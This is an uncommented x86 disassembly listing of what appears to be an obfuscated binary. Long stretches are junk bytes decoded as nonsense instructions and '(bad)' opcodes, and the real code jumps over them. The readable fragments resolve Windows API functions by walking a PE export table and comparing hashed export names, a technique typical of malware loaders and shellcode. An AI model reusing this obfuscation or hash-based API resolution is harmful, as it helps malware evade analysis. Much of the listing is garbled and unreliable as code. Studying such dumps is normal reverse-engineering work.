  401950:	or     DWORD PTR [ebx],esp
  401952:	push   0xe530b5d1
  401957:	call   0x2fcd3920
  40195c:	int3   
  40195d:	ins    BYTE PTR es:[edi],dx
  40195e:	push   cs
  40195f:	sub    dh,cl
  401961:	xchg   ebp,eax
  401962:	jp     0x401903
  401964:	aas    
  401965:	int3   
  401966:	(bad)  [edi+ebx*4+0x72]
  40196a:	jnp    0x4019ca
  40196c:	pop    es
  40196d:	or     al,BYTE PTR [ebx+0x2]
  401970:	data16 test BYTE PTR [eax+0x62304aca],0x81
  401978:	jbe    0x40191c
  40197a:	fisttp QWORD PTR [ebx]
  40197c:	ins    BYTE PTR es:[edi],dx
  40197d:	mov    ebp,0xfc1db1a6
  401982:	(bad)  
  401983:	leave  
  401984:	(bad)  
  401985:	imul   bl
  401987:	aam    0x81
  401989:	pop    esp
  40198a:	std    
  40198b:	cmp    eax,0x1a21e5eb
  401990:	stc    
  401991:	mov    dh,0x4f
  401993:	xor    BYTE PTR [edx-0x1ba1943f],0x4d
  40199a:	jl     0x4019b9
  40199c:	iret   
  40199d:	lods   eax,DWORD PTR ds:[esi]
  40199e:	jns    0x401a10
  4019a0:	or     bh,BYTE PTR [edx-0xb6bd44b]
  4019a6:	shr    DWORD PTR [ebp-0x71a9c74f],1
  4019ac:	pop    ds
  4019ad:	retf   0x8e75
  4019b0:	scas   eax,DWORD PTR es:[edi]
  4019b1:	hlt    
  4019b2:	mov    edi,0x5b2fa701
  4019b7:	xor    al,0x5e
  4019b9:	test   BYTE PTR [ecx+0x21],dl
  4019bc:	int3   
  4019bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019be:	(bad)  
  4019bf:	push   edi
  4019c0:	test   BYTE PTR [ebx],ch
  4019c2:	test   DWORD PTR [ebx+esi*2-0x6587bb2a],edx
  4019c9:	xchg   BYTE PTR [edi-0x2e3aefa6],dl
  4019cf:	(bad)  
  4019d0:	push   DWORD PTR [ebp+0x8]
  4019d3:	call   0x408097
  4019d8:	jmp    0x401aab
  4019dd:	cld    
  4019de:	mov    ecx,eax
  4019e0:	mov    ecx,ebx
  4019e2:	dec    ebx
  4019e3:	mov    edi,0x495a648b
  4019e8:	aad    0xec
  4019ea:	dec    esp
  4019eb:	or     BYTE PTR [eax+0x7c7c73ac],al
  4019f1:	mov    ds:0xff7c7c7c,al
  4019f6:	je     0x4019c0
  4019f8:	imul   ebx,DWORD PTR [edx-0x27],0xa53b01c5
  4019ff:	cld    
  401a00:	push   ss
  401a01:	repnz push ecx
  401a03:	sti    
  401a04:	sub    BYTE PTR [edx-0x5ca613cb],al
  401a0a:	ins    DWORD PTR es:[edi],dx
  401a0b:	lahf   
  401a0c:	lods   eax,DWORD PTR ds:[esi]
  401a0d:	cs mov esp,0x2cae2ddb
  401a13:	mov    ebp,0xf12cc150
  401a18:	cmp    bl,ch
  401a1a:	sbb    BYTE PTR [eax+0x6f92df09],bl
  401a20:	pop    ss
  401a21:	test   eax,0x89fba4e1
  401a26:	not    edi
  401a28:	xchg   DWORD PTR [esi-0x5e],eax
  401a2b:	mov    al,ds:0x5174615a
  401a30:	xchg   ebp,eax
  401a31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a32:	and    ebx,DWORD PTR [ecx]
  401a34:	cmp    DWORD PTR [esp+ebp*1],0xffffffa2
  401a38:	ror    DWORD PTR ds:0x53bca304,1
  401a3e:	cld    
  401a3f:	xor    eax,0xd173dd39
  401a44:	jmp    0x401a42
  401a46:	pop    ecx
  401a47:	fldenv [ecx]
  401a49:	ins    DWORD PTR es:[edi],dx
  401a4a:	jno    0x401a3f
  401a4c:	mov    DWORD PTR [edx+0x1f],esi
  401a4f:	fnstsw WORD PTR [esi]
  401a51:	inc    esi
  401a52:	sbb    al,0xb1
  401a54:	jp     0x401a60
  401a56:	fcomp  DWORD PTR [edi+ebp*8+0x69]
  401a5a:	sbb    al,0x5
  401a5c:	mov    dl,0x83
  401a5e:	push   ebx
  401a5f:	outs   dx,DWORD PTR ds:[esi]
  401a60:	into   
  401a61:	jns    0x401a69
  401a63:	xor    al,BYTE PTR [edx-0x7]
  401a66:	stos   DWORD PTR es:[edi],eax
  401a67:	sub    eax,DWORD PTR [esp+eax*1]
  401a6a:	and    ebp,eax
  401a6c:	sbb    DWORD PTR ds:0x727f6848,esi
  401a72:	jae    0x401a62
  401a74:	and    eax,DWORD PTR [ebp-0x4d]
  401a77:	out    0xbd,eax
  401a79:	adc    BYTE PTR [esp+esi*2-0x32],ch
  401a7d:	bound  ecx,QWORD PTR [ebp-0x21d4906c]
  401a83:	outs   dx,DWORD PTR ds:[esi]
  401a84:	retf   
  401a85:	hlt    
  401a86:	scas   eax,DWORD PTR es:[edi]
  401a87:	sbb    ebx,DWORD PTR [edi+0x4299371e]
  401a8d:	test   eax,0x8e65b32b
  401a92:	xor    eax,0x65dbedc4
  401a97:	mov    ds:0x7f9cabc3,al
  401a9c:	dec    eax
  401a9d:	aad    0x5f
  401a9f:	jne    0x401a53
  401aa1:	push   0x2c189fa3
  401aa6:	in     eax,0x34
  401aa8:	retf   0x54ca
  401aab:	mov    DWORD PTR [ebp-0x14],eax
  401aae:	mov    eax,DWORD PTR [ebp-0x4]
  401ab1:	add    DWORD PTR ds:0x44b6cc,ecx
  401ab7:	mov    ecx,DWORD PTR [ebp-0x14]
  401aba:	xor    eax,esi
  401abc:	add    eax,ebx
  401abe:	mov    DWORD PTR ds:0x4247ce,0x6998
  401ac8:	cmp    ecx,eax
  401aca:	mov    DWORD PTR ds:0x44b6d4,0x4e4a
  401ad4:	je     0x4021a9
  401ada:	mov    eax,DWORD PTR [ebp-0x14]
  401add:	mov    eax,DWORD PTR [eax+0x18]
  401ae0:	and    DWORD PTR ds:0x448994,0x0
  401aea:	xor    ecx,ecx
  401aec:	add    ecx,DWORD PTR ds:0x448994
  401af2:	inc    ecx
  401af3:	mov    DWORD PTR ds:0x448994,ecx
  401af9:	cmp    DWORD PTR ds:0x448994,0x7
  401b00:	jne    0x401b19
  401b06:	push   0x41098d
  401b0b:	push   0x41075f
  401b10:	push   DWORD PTR [ebp-0x1c]
  401b13:	call   DWORD PTR ds:0x443344
  401b19:	cmp    DWORD PTR ds:0x448994,0x6
  401b20:	jne    0x401b35
  401b26:	xor    ecx,ecx
  401b28:	xor    ecx,DWORD PTR ds:0x448994
  401b2e:	inc    ecx
  401b2f:	mov    DWORD PTR ds:0x448994,ecx
  401b35:	cmp    DWORD PTR ds:0x448994,0x12
  401b3c:	jb     0x401aea
  401b42:	sub    DWORD PTR ds:0x4247d2,0x3b9b
  401b4c:	jmp    0x401c1f
  401b51:	inc    ecx
  401b52:	adc    eax,0x9d621a92
  401b57:	jns    0x401bc6
  401b59:	retf   
  401b5a:	push   cs
  401b5b:	ins    BYTE PTR es:[edi],dx
  401b5c:	jno    0x401bc2
  401b5e:	mov    esi,0x72d25e30
  401b63:	jl     0x401be1
  401b65:	mov    ds:0x2b7c7c7c,al
  401b6a:	push   ebx
  401b6b:	jge    0x401ba9
  401b6d:	inc    ebp
  401b6e:	jne    0x401b7b
  401b70:	push   edi
  401b71:	mov    WORD PTR [edx-0x5d1c1e6d],ds
  401b77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b79:	jo     0x401bb9
  401b7b:	add    esi,DWORD PTR [ebx-0x33]
  401b7e:	ficom  WORD PTR [esp+edi*4+0x4c]
  401b82:	inc    edi
  401b83:	xor    ch,BYTE PTR [esi+ebx*1-0x92687f4]
  401b8a:	jne    0x401b76
  401b8c:	sub    dh,BYTE PTR [edi-0x33e999bf]
  401b92:	in     al,0xcb
  401b94:	enter  0xa33c,0xe0
  401b98:	cld    
  401b99:	test   esp,eax
  401b9b:	push   ss
  401b9c:	retf   
  401b9d:	and    edx,0x8da68f7f
  401ba3:	sbb    al,al
  401ba5:	pushf  
  401ba6:	mov    esi,0xdc670c6c
  401bab:	(bad)  
  401bac:	psrld  mm6,QWORD PTR [edi+edi*8]
  401bb0:	mov    ch,0x8f
  401bb2:	push   esi
  401bb3:	(bad)  [edi-0x83756c]
  401bb9:	rol    ecx,cl
  401bbb:	in     eax,0x4c
  401bbd:	(bad)  
  401bbe:	or     bl,bh
  401bc0:	jp     0x401c01
  401bc2:	je     0x401b54
  401bc4:	xchg   ebx,eax
  401bc5:	xor    ebx,edi
  401bc7:	xchg   ecx,eax
  401bc8:	xchg   edi,eax
  401bc9:	js     0x401c01
  401bcb:	nop
  401bcc:	adc    al,0x2e
  401bce:	add    DWORD PTR [ecx+0x1436e7a2],ebp
  401bd4:	sti    
  401bd5:	mov    ah,0xa3
  401bd7:	cld    
  401bd8:	iret   
  401bd9:	push   cs
  401bda:	inc    esp
  401bdb:	enter  0xf5f4,0x44
  401bdf:	leave  
  401be0:	ror    BYTE PTR [esi+ebp*4],0xf2
  401be4:	int3   
  401be5:	shl    DWORD PTR [edx-0x1255cc63],cl
  401beb:	or     al,BYTE PTR [esi+0x49183a62]
  401bf1:	adc    eax,DWORD PTR [edx]
  401bf3:	call   0x254a:0xe780e76c
  401bfa:	dec    esi
  401bfb:	push   esp
  401bfc:	clc    
  401bfd:	out    0x68,eax
  401bff:	leave  
  401c00:	data16 out dx,al
  401c02:	call   0x38780a43
  401c07:	int3   
  401c08:	aam    0xc7
  401c0a:	pop    edx
  401c0b:	dec    edi
  401c0c:	scas   al,BYTE PTR es:[edi]
  401c0d:	int3   
  401c0e:	in     al,dx
  401c0f:	dec    ecx
  401c10:	mov    esp,0xa0c60da4
  401c15:	inc    ebx
  401c16:	jge    0x401c49
  401c18:	(bad)  
  401c19:	loope  0x401c8b
  401c1b:	(bad)  
  401c1c:	sub    DWORD PTR [ecx-0x1fba7675],esi
  401c22:	and    ecx,0x68b3
  401c28:	mov    eax,DWORD PTR [ebp-0x14]
  401c2b:	mov    ecx,DWORD PTR [ebp+0x8]
  401c2e:	and    DWORD PTR ds:0x44899c,0x44b6e0
  401c38:	add    ecx,DWORD PTR [eax+0x20]
  401c3b:	movzx  eax,BYTE PTR ds:0x44e424
  401c42:	and    eax,DWORD PTR ds:0x44b6e4
  401c48:	mov    ds:0x44e424,eax
  401c4d:	mov    DWORD PTR [ebp-0x28],ecx
  401c50:	sub    DWORD PTR ds:0x4247da,ecx
  401c56:	mov    eax,DWORD PTR [ebp-0x14]
  401c59:	and    DWORD PTR ds:0x41074b,0x0
  401c63:	jmp    0x401c75
  401c68:	mov    ecx,DWORD PTR ds:0x41074b
  401c6e:	inc    ecx
  401c6f:	mov    DWORD PTR ds:0x41074b,ecx
  401c75:	cmp    DWORD PTR ds:0x41074b,0x1d
  401c7c:	jae    0x401cc9
  401c82:	cmp    DWORD PTR ds:0x41074b,0x9
  401c89:	jne    0x401caa
  401c8f:	push   DWORD PTR [ebp-0x20]
  401c92:	push   0x8068
  401c97:	push   0x67b9
  401c9c:	push   0x4109ab
  401ca1:	push   DWORD PTR [ebp-0x24]
  401ca4:	call   DWORD PTR ds:0x4430c8
  401caa:	cmp    DWORD PTR ds:0x41074b,0x8
  401cb1:	jne    0x401cc4
  401cb7:	mov    ecx,DWORD PTR ds:0x41074b
  401cbd:	inc    ecx
  401cbe:	mov    DWORD PTR ds:0x41074b,ecx
  401cc4:	jmp    0x401c68
  401cc9:	mov    ecx,DWORD PTR [ebp+0x8]
  401ccc:	not    DWORD PTR ds:0x44898c
  401cd2:	add    ecx,DWORD PTR [eax+0x24]
  401cd5:	xor    DWORD PTR ds:0x44b6e0,0x6435
  401cdf:	mov    DWORD PTR [ebp-0x2c],ecx
  401ce2:	jmp    0x401db5
  401ce7:	cmp    edi,DWORD PTR [ebx]
  401ce9:	mov    eax,0xbd95b815
  401cee:	cmp    eax,0x3403dcf7
  401cf3:	ins    DWORD PTR es:[edi],dx
  401cf4:	xchg   ebp,eax
  401cf5:	repz sbb BYTE PTR cs:[ebp+0x7c],dh
  401cfa:	jl     0x401c9e
  401cfc:	jl     0x401d7a
  401cfe:	jl     0x401c9e
  401d00:	scas   eax,DWORD PTR es:[edi]
  401d01:	neg    DWORD PTR [ebp+0x1e467db]
  401d07:	or     BYTE PTR [edi-0x3a3b361f],al
  401d0d:	and    edi,DWORD PTR ds:0x723e147e
  401d13:	out    dx,al
  401d14:	popa   
  401d15:	jne    0x401ccd
  401d17:	jne    0x401ca6
  401d19:	jl     0x401cda
  401d1b:	je     0x401d5c
  401d1d:	pop    edi
  401d1e:	aas    
  401d1f:	int3   
  401d20:	(bad)  
  401d21:	mov    ebp,0x8ce1ae9d
  401d26:	out    dx,eax
  401d27:	test   esp,ebp
  401d29:	(bad)  
  401d2a:	aad    0xc2
  401d2c:	or     ch,BYTE PTR [edi-0x7a511f6d]
  401d32:	dec    ebx
  401d33:	pop    esi
  401d34:	push   esp
  401d35:	mov    bl,0x7f
  401d37:	mov    dl,0x31
  401d39:	inc    eax
  401d3a:	lds    esi,FWORD PTR [ecx+eax*4-0x24938ddc]
  401d41:	mov    ebx,0x88c9a0c8
  401d46:	in     al,dx
  401d47:	jnp    0x401d47
  401d49:	mov    eax,ds:0x403dd09f
  401d4e:	dec    ebp
  401d4f:	jno    0x401ce9
  401d51:	loope  0x401daa
  401d53:	dec    ebx
  401d54:	mov    ch,0x4f
  401d56:	jo     0x401d96
  401d58:	test   DWORD PTR [eax+0x65],0x3b3f33ab
  401d5f:	mov    DWORD PTR [edi-0x537d6307],edx
  401d65:	pop    esi
  401d66:	jbe    0x401d58
  401d68:	xchg   edx,eax
  401d69:	ja     0x401daf
  401d6b:	outs   dx,BYTE PTR ds:[esi]
  401d6c:	push   esp
  401d6d:	cmp    cl,ch
  401d6f:	les    edi,FWORD PTR [eax+0x3]
  401d72:	xchg   edx,eax
  401d73:	push   0xaf8dfea4
  401d78:	dec    eax
  401d79:	outs   dx,BYTE PTR ds:[esi]
  401d7a:	dec    esi
  401d7b:	gs loop 0x401da7
  401d7e:	and    eax,0x142a7532
  401d83:	push   ss
  401d84:	shl    BYTE PTR [esi],cl
  401d86:	and    edx,DWORD PTR [eax+0x61b7439b]
  401d8c:	pcmpgtb mm6,QWORD PTR [eax]
  401d8f:	pushf  
  401d90:	inc    eax
  401d91:	cli    
  401d92:	mov    fs,WORD PTR [edx-0x35685b48]
  401d98:	in     eax,0x4a
  401d9a:	(bad)  
  401d9c:	es pusha 
  401d9e:	adc    DWORD PTR [ebp+edx*8-0x7],ecx
  401da2:	mov    DWORD PTR [edx],esi
  401da4:	aaa    
  401da5:	push   eax
  401da6:	in     eax,0xc1
  401da8:	add    cl,BYTE PTR [ebp-0x57fd6bae]
  401dae:	jbe    0x401e18
  401db0:	out    0xdc,eax
  401db2:	aas    
  401db3:	push   esp
  401db4:	daa    
  401db5:	mov    eax,DWORD PTR [ebp-0x14]
  401db8:	mov    DWORD PTR ds:0x41075b,0x19
  401dc2:	cmp    DWORD PTR ds:0x41075b,0x0
  401dc9:	je     0x401e11
  401dcf:	cmp    DWORD PTR ds:0x41075b,0xb
  401dd6:	jne    0x401de5
  401ddc:	push   DWORD PTR [ebp-0x24]
  401ddf:	call   DWORD PTR ds:0x4430cc
  401de5:	cmp    DWORD PTR ds:0x41075b,0xc
  401dec:	jne    0x401dff
  401df2:	mov    ecx,DWORD PTR ds:0x41075b
  401df8:	dec    ecx
  401df9:	mov    DWORD PTR ds:0x41075b,ecx
  401dff:	mov    ecx,DWORD PTR ds:0x41075b
  401e05:	dec    ecx
  401e06:	mov    DWORD PTR ds:0x41075b,ecx
  401e0c:	jmp    0x401dc2
  401e11:	mov    ecx,DWORD PTR [ebp+0x8]
  401e14:	add    ecx,DWORD PTR [eax+0x1c]
  401e17:	xor    esi,esi
  401e19:	mov    DWORD PTR [ebp-0x14],ecx
  401e1c:	jmp    0x401eef
  401e21:	xor    al,0x72
  401e23:	mov    ds:0x46657dd5,eax
  401e28:	sub    eax,0xe5b1e0bc
  401e2d:	pushf  
  401e2e:	mov    eax,0x754ee3ed
  401e33:	jl     0x401eb1
  401e35:	mov    ds:0x417c7c7c,al
  401e3a:	aad    0x2e
  401e3c:	lock add al,0x1a
  401e3f:	(bad)  
  401e40:	sahf   
  401e41:	sbb    eax,esp
  401e43:	xchg   esi,eax
  401e44:	mov    ds:0x45357bbe,eax
  401e49:	jle    0x401dfc
  401e4b:	lea    ebx,[edi+0x22]
  401e4e:	fld    QWORD PTR [ebp+0x6db1e2d1]
  401e54:	xchg   BYTE PTR [ebp-0x7d],cl
  401e57:	push   esi
  401e58:	dec    ebx
  401e59:	repnz adc eax,0xa6352c9b
  401e5f:	push   ebx
  401e60:	sar    BYTE PTR [edi+eiz*8+0x3b7b94e2],1
  401e67:	mov    al,ds:0x8b1af6c3
  401e6c:	adc    al,0xea
  401e6e:	cld    
  401e6f:	pop    ecx
  401e70:	iret   
  401e71:	mov    edx,0xc313c6e
  401e76:	aad    0x51
  401e78:	jle    0x401dfb
  401e7a:	push   0xffffff9f
  401e7c:	pushf  
  401e7d:	arpl   WORD PTR [edi-0x38],bx
  401e80:	fcomip st,st(4)
  401e82:	add    eax,0x25a0507a
  401e87:	dec    eax
  401e88:	jno    0x401e96
  401e8a:	lds    edi,FWORD PTR [ebx]
  401e8c:	jmp    0x4d20:0x8978b10a
  401e93:	push   edi
  401e94:	pop    ds
  401e95:	mov    cl,BYTE PTR [ebx]
  401e97:	or     bl,BYTE PTR [esi-0x52]
  401e9a:	cmp    cl,bl
  401e9c:	sbb    dl,bh
  401e9e:	jp     0x401e44
  401ea0:	ins    DWORD PTR es:[edi],dx
  401ea1:	xor    al,0x89
  401ea3:	mov    ch,0xfd
  401ea5:	push   esp
  401ea6:	ins    DWORD PTR es:[edi],dx
  401ea7:	ret    
  401ea8:	push   ss
  401ea9:	outs   dx,BYTE PTR ds:[esi]
  401eaa:	xor    dl,BYTE PTR [edi]
  401eac:	shr    BYTE PTR [ecx+eax*4+0x3c],cl
  401eb0:	inc    edi
  401eb1:	jmp    0x401ecf
  401eb3:	stc    
  401eb4:	mov    esp,eax
  401eb6:	inc    edi
  401eb7:	pop    es
  401eb8:	mov    eax,0x8ae06c5f
  401ebd:	imul   ecx,ebx,0xffffffaf
  401ec0:	jmp    0xf6c:0xc77b8ccb
  401ec7:	and    ah,bh
  401ec9:	sbb    ch,BYTE PTR [ebx]
  401ecb:	dec    eax
  401ecc:	sub    al,0xb6
  401ece:	xor    DWORD PTR [eax+0x1f],edi
  401ed1:	stos   BYTE PTR es:[edi],al
  401ed2:	scas   al,BYTE PTR es:[edi]
  401ed3:	mov    esi,0x883d8f8
  401ed8:	xor    al,0x6c
  401eda:	into   
  401edb:	push   esi
  401edc:	outs   dx,DWORD PTR ds:[esi]
  401edd:	push   esi
  401ede:	pop    esp
  401edf:	fst    DWORD PTR [ecx-0x7c]
  401ee2:	aaa    
  401ee3:	aad    0x7d
  401ee5:	mov    bh,0x91
  401ee7:	fnsave [ebx-0x3917496e]
  401eed:	xor    esp,ebx
  401eef:	mov    eax,DWORD PTR [ebp-0x28]
  401ef2:	mov    ecx,DWORD PTR [ebp+0x8]
  401ef5:	add    ecx,DWORD PTR [eax+edi*4]
  401ef8:	lea    eax,[ebp-0x8]
  401efb:	mov    DWORD PTR [ebp-0x30],ecx
  401efe:	push   eax
  401eff:	push   DWORD PTR [ebp-0x30]
  401f02:	jmp    0x401fd5
  401f07:	pop    esp
  401f08:	jecxz  0x401f20
  401f0a:	xchg   ebp,eax
  401f0b:	mov    ebp,0x1ee56b7d
  401f10:	jb     0x401ec2
  401f12:	daa    
  401f13:	rcr    al,1
  401f15:	icebp  
  401f16:	retf   0x74f4
  401f19:	jl     0x401f97
  401f1b:	mov    ds:0x197c7c7c,al
  401f20:	stos   DWORD PTR es:[edi],eax
  401f21:	inc    edx
  401f22:	sub    eax,0xc1a645d0
  401f27:	popf   
  401f28:	shl    esi,cl
  401f2a:	and    eax,0x1eb02d1e
  401f2f:	mov    dl,0x43
  401f31:	xchg   esp,eax
  401f32:	jmp    0x3a32d388
  401f37:	mov    bl,0x95
  401f39:	lahf   
  401f3a:	sub    BYTE PTR [edi-0x59],cl
  401f3d:	pop    es
  401f3e:	call   0x738311d8
  401f43:	xor    al,0xc0
  401f45:	jmp    0x401f11
  401f47:	(bad)  
  401f48:	and    al,ah
  401f4a:	add    cl,al
  401f4c:	xchg   ecx,eax
  401f4d:	cmp    BYTE PTR [edi-0x56],ah
  401f50:	mov    esi,0x1f296866
  401f55:	push   es
  401f56:	inc    ebx
  401f57:	push   ebp
  401f58:	sub    edi,esi
  401f5a:	je     0x401ee5
  401f5c:	jnp    0x401f56
  401f5e:	fisttp DWORD PTR [ecx-0x25]
  401f61:	mov    edx,0x66f6500
  401f66:	mov    BYTE PTR [esi+edx*2-0x33],cl
  401f6a:	std    
  401f6b:	adc    eax,0x82bb4667
  401f70:	jge    0x401f9d
  401f72:	add    DWORD PTR [esi],0xb246cc91
  401f78:	mov    edx,0xe5553bfd
  401f7d:	fadd   st,st(2)
  401f7f:	add    ch,bl
  401f81:	shl    BYTE PTR gs:[ebx],0x9f
  401f85:	adc    ecx,edx
  401f87:	mov    bl,0xf7
  401f89:	sar    BYTE PTR [edi-0x71],1
  401f8c:	push   ebp
  401f8d:	push   ebp
  401f8e:	fst    DWORD PTR [edi-0x2207b1d9]
  401f94:	or     esp,edx
  401f96:	xchg   ecx,eax
  401f97:	push   esp
  401f98:	cld    
  401f99:	out    0x55,eax
  401f9b:	test   BYTE PTR [ebx+0x412df655],cl
  401fa1:	push   ebx
  401fa2:	lods   al,BYTE PTR ds:[esi]
  401fa3:	adc    DWORD PTR [esi],0x69
  401fa6:	addr16 enter 0x1565,0xf0
  401fab:	pushf  
  401fac:	xchg   esp,eax
  401fad:	addr16 (bad) 
  401faf:	shr    esi,1
  401fb1:	xchg   ecx,eax
  401fb2:	adc    edx,DWORD PTR [ebx]
  401fb4:	cmp    DWORD PTR [edx-0x76],esi
  401fb7:	xchg   ebx,eax
  401fb8:	icebp  
  401fb9:	inc    esp
  401fbb:	loopne 0x401fdc
  401fbd:	push   esp
  401fbe:	sbb    DWORD PTR [ecx],0xffffffd7
  401fc1:	cmp    eax,0x95830ee7
  401fc6:	mov    ds:0xcc1805a5,eax
  401fcb:	jmp    0xfd5b:0x5fca890d
  401fd2:	not    BYTE PTR [edi]
  401fd4:	cmp    edi,0xcee90c75
  401fda:	add    BYTE PTR [eax],al
  401fdc:	add    BYTE PTR [edx],cl
  401fde:	adc    al,0x28
  401fe0:	mov    dl,0x2a
  401fe2:	mov    dl,0x6a
  401fe4:	push   esp
  401fe5:	int3   
  401fe6:	xchg   ebp,eax
  401fe7:	xchg   esp,eax
  401fe8:	int    0x80
  401fea:	mov    ch,0xc5
  401fec:	cmp    dh,BYTE PTR ds:[edi+0x7c]
  401ff0:	jl     0x401f94
  401ff2:	jl     0x402070
  401ff4:	jl     0x402018
  401ff6:	sub    ah,BYTE PTR [eax+0x79fffbd9]
  401ffc:	cmp    eax,0xf567e513
  402001:	jecxz  0x401fc5
  402003:	mov    ebp,0xc89c72c4
  402008:	jmp    0x402035
  40200a:	or     BYTE PTR [ecx-0x1e],dh
  40200d:	fisub  DWORD PTR [eax+0x5a7937b1]
  402013:	push   ebx
  402014:	add    al,0x9d
  402016:	dec    ebp
  402017:	mov    ebx,0x4bcf5d15
  40201c:	aad    0x5e
  40201e:	pop    eax
  40201f:	mov    ds:0x81263808,al
  402024:	pop    ebx
  402025:	aaa    
  402026:	cmp    BYTE PTR [edx-0x5d259f4f],cl
  40202c:	cwde   
  40202d:	xor    ah,BYTE PTR [ecx]
  40202f:	imul   eax,DWORD PTR [ebx+0x596ea13e],0x63
  402036:	mov    ds:0xe9b3ee1e,al
  40203b:	push   edi
  40203c:	inc    esp
  40203d:	js     0x401ffa
  40203f:	mov    eax,0x794afa99
  402044:	test   eax,0x98c483f8
  402049:	push   ebp
  40204a:	stc    
  40204b:	cmp    ebp,edx
  40204d:	outs   dx,BYTE PTR ds:[esi]
  40204e:	pop    eax
  40204f:	(bad)  
  402050:	ds jge 0x402027
  402053:	mov    ch,0xc8
  402055:	test   al,0xb4
  402057:	je     0x402057
  402059:	jmp    0xb147:0xf299e65e
  402060:	and    bl,ch
  402062:	xchg   BYTE PTR fs:[esi+eiz*8-0x46],bh
  402067:	enter  0x30bc,0x72
  40206b:	div    ebp
  40206d:	cwd    
  40206f:	and    DWORD PTR ds:0xbfbcbb7e,eax
  402075:	test   al,0xda
  402077:	sbb    DWORD PTR [ecx-0x4c],ebp
  40207a:	out    dx,eax
  40207b:	jne    0x4020bb
  40207d:	cld    
  40207e:	jmp    DWORD PTR [edi+0xf]
  402081:	outs   dx,BYTE PTR ds:[esi]
  402082:	jb     0x4020c8
  402084:	jecxz  0x4020e2
  402086:	popa   
  402087:	pop    edi
  402088:	aad    0xfb
  40208a:	sub    DWORD PTR [ebx-0x55696ca7],0xb6c8fb6
  402094:	add    eax,0x8f31ad88
  402099:	pop    ebx
  40209a:	pop    ds
  40209b:	dec    edx
  40209c:	pop    esp
  40209d:	or     BYTE PTR [edx-0x26],dl
  4020a0:	xchg   BYTE PTR [edi-0x14],bh
  4020a3:	jmp    0x9dc2:0x13e1111f
  4020aa:	and    ebp,eax
  4020ac:	call   0x8b402122
  4020b1:	inc    ebp
  4020b2:	cld    
  4020b3:	mov    ecx,DWORD PTR [ebp-0x8]
  4020b6:	xor    eax,0x7510857
  4020bb:	add    eax,ebx
  4020bd:	cmp    ecx,eax
  4020bf:	jne    0x4021b5
  4020c5:	jmp    0x402198
  4020ca:	dec    esp
  4020cb:	xchg   esp,eax
  4020cc:	pop    edi
  4020cd:	add    BYTE PTR [edi-0x25],ah
  4020d0:	arpl   WORD PTR [eax-0x10],bp
  4020d3:	adc    ebx,DWORD PTR [eax-0x11593eb8]
  4020d9:	(bad)  
  4020da:	pusha  
  4020db:	ja     0x402159
  4020dd:	jl     0x402081
  4020df:	jl     0x40215d
  4020e1:	jl     0x40211b
  4020e3:	fdivrp st(1),st
  4020e5:	mov    ch,0x7c
  4020e7:	fsubr  st(7),st
  4020e9:	mov    ch,0xf3
  4020eb:	outs   dx,BYTE PTR ds:[esi]
  4020ec:	ret    
  4020ed:	sub    BYTE PTR [edi],ah
  4020ef:	or     DWORD PTR [esi+0x72b3ef01],esi
  4020f5:	dec    eax
  4020f6:	pusha  
  4020f7:	pop    eax
  4020f8:	sbb    eax,0x924b9df8
  4020fd:	push   0x74
  4020ff:	push   edi
  402100:	mov    esp,0xa3963a49
  402105:	sbb    DWORD PTR [edi+0x2595ab4b],esp
  40210b:	(bad)  
  40210c:	jne    0x40208e
  40210e:	pop    edx
  40210f:	je     0x402166
  402111:	or     BYTE PTR [esp+ecx*4-0x17404ed1],al
  402118:	retf   
  402119:	sub    eax,0x35c04d77
  40211e:	push   ebx
  40211f:	stos   BYTE PTR es:[edi],al
  402120:	jecxz  0x4020c7
  402122:	mov    es,WORD PTR [eax-0x59]
  402125:	adc    ecx,DWORD PTR [eax]
  402127:	fsubrp st(2),st
  402129:	or     esp,DWORD PTR [edx]
  40212b:	clc    
  40212c:	(bad)  
  40212d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40212e:	adc    BYTE PTR [esi+0x55],0x73
  402132:	mov    al,0x36
  402134:	ret    
  402135:	adc    eax,0x9538d9e1
  40213a:	test   BYTE PTR [ebp-0x27],cl
  40213d:	fdivr  QWORD PTR [ebx+0x51c1b5ef]
  402143:	mov    esp,0xd70f43ff
  402148:	jne    0x40218e
  40214a:	cmp    al,0x7c
  40214c:	add    BYTE PTR [edx+0x694f705a],0xdb
  402153:	lahf   
  402154:	ret    
  402155:	xor    BYTE PTR [ebx+0x6d4517a1],cl
  40215b:	sub    ah,BYTE PTR [eax]
  40215d:	and    al,0x2a
  40215f:	jae    0x402145
  402161:	push   ss
  402162:	lea    edi,[ecx+0x3c]
  402165:	outs   dx,BYTE PTR ds:[esi]
  402166:	mov    bl,BYTE PTR [esi]
  402168:	sub    dh,BYTE PTR [eax]
  40216a:	or     esp,DWORD PTR [eax-0xb]
  40216d:	sbb    DWORD PTR [ebx+0x5c],esp
  402170:	test   BYTE PTR [eax-0x67],ch
  402173:	aaa    
  402174:	mov    WORD PTR [edi-0x538bc46f],gs
  40217a:	mov    esi,0x5620a6fd
  40217f:	xor    BYTE PTR [esi+0x6dbdcd1b],dl
  402185:	in     eax,0xc4
  402187:	add    dh,bh
  402189:	cmp    al,0xb0
  40218b:	scas   eax,DWORD PTR es:[edi]
  40218c:	retf   0xd4ee
  40218f:	aad    0x93
  402191:	push   edi
  402192:	mov    ebp,DWORD PTR [edi+0x3d4dc268]
  402198:	mov    eax,DWORD PTR [ebp-0x20]
  40219b:	inc    edi
  40219c:	cmp    edi,eax
  40219e:	jb     0x401676
  4021a4:	jmp    0x402298
  4021a9:	mov    eax,DWORD PTR [ebp-0x4]
  4021ac:	xor    eax,esi
  4021ae:	add    eax,ebx
  4021b0:	jmp    0x402c24
  4021b5:	mov    eax,DWORD PTR [ebp-0x2c]
  4021b8:	movzx  eax,WORD PTR [eax+edi*2]
  4021bc:	mov    ecx,DWORD PTR [ebp-0x14]
  4021bf:	mov    eax,DWORD PTR [ecx+eax*4]
  4021c2:	jmp    0x402295
  4021c7:	lods   eax,DWORD PTR ds:[esi]
  4021c8:	adc    ah,BYTE PTR [edi+0x7d7da75f]
  4021ce:	jmp    0xa860:0xa7f835f7
  4021d5:	inc    ebp
  4021d6:	std    
  4021d7:	xchg   esi,eax
  4021d8:	jbe    0x402256
  4021da:	jl     0x40217e
  4021dc:	jl     0x40225a
  4021de:	jl     0x40219b
  4021e0:	ror    cl,0xf5
  4021e3:	stos   BYTE PTR es:[edi],al
